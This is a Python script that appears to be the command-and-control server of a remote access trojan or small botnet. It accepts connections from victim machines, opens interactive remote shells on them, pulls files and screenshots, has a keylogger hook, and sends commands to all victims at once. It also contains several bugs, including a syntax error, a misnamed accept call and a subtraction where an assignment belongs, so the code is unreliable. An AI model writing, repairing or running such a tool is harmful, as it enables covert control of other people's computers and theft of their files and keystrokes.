#!/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/24/2021

import socket
import json
import os
import base64
import threading

count = 0

def sendToAll(target, data):
    jsonData = json.dumps(data)
    target.send(jsonData.encode())

def shell(target, ip):
    def reliable_send(data):
        jsonData = json.dumps(data)
        target.send(jsonData.encode())

    def reliable_recv():
        data = b''
        while True:
            try:
                data = data + target.recv(1024)
                return json.loads(data)
            except ValueError:
                continue

    global count
    while True:
        command = input("Shell#~%s: " % str(ip))
        reliable_send(command)
        if command == 'exit':
            break

        elif command == "close":
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break

        elif command[:2] == "cd" and len(command) > 1:
            continue

        elif command[:8] == "download":
            with open(command[9:], "wb") as download:
                fileData = reliable_recv()
                download.write(base64.b64decode(fileData))

        elif command[:6] == "upload": #Work in Progress
            with open(command[7:], "rb") as upload:
                try:
                    reliable_send(base64.b64encode(upload.read()))
                except:
                    failed = '[-] Failed to Upload'
                    print(colored(failed, "red"))
                    reliable_send(base64.b64encode(failed))

        elif command[:10] == "screenshot": #Work in Progress
            with open("screenshot%d" % count, "wb") as sc:
                image = reliable_recv()
                imageDecode = base64.b64decode(image)
                if imageDecode[:3] == "[-]":
                    print(image)
                else:
                    sc.write(image)
                    count += 1

        elif command[:12] == "keylog start":
            continue

        else:
            result = reliable_recv()
            print(result)

def server():
    global clients
    while True:
        if stopThreads:
            break
        sock.settimeout(1)
        try:
            target, ip = socket.accept()
            targets.append(target)
            ips.append(ip)
            print(str(targets[clients]) + " --- " str(ips[clients]) + "has connected")
            clients += 1
        except:
            pass

global sock
ips = []
targets = []
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt((socket.SOL_SOCKET, socket.SO_REUSEADDR, 1))
sock.bind(("192.168.7.125", 54321))
sock.listen(5)

clients = 0
stopThreads = False

print("[!] Waiting for Targets to Connect...")

t1 = threading.Thread(target=server)
t1.start()

while True:
    command = input("Command to Send to Control Center: ")
    if command == "targets":
        count = 0
        for ip in ips:
            print("Session " + str(count) + ". <-->" + str(ip))
            count+= 1

    elif command[:7] == "session":
        try:
            num = int(command[8:])
            targNum = targets[num]
            targIP - ips[num]
            shell(targNum, targIP)
        except:
            print("[-] No Session Under That Number")
    elif command == "exit":
        for target in targets:
            target.close()
        sock.close()
        stopThread = True

    elif command[:7] == "sendall":
        lengthTargs = len(targets)
        i = 0
        try:
            while i < lengthTargs:
                targNum = targets[i]
                sendToAll(targNum, command)
                i += 1
        except:
            print('[-] Failed to Send Command to All Targets')
    else:
        print('[-] Command Not Found')

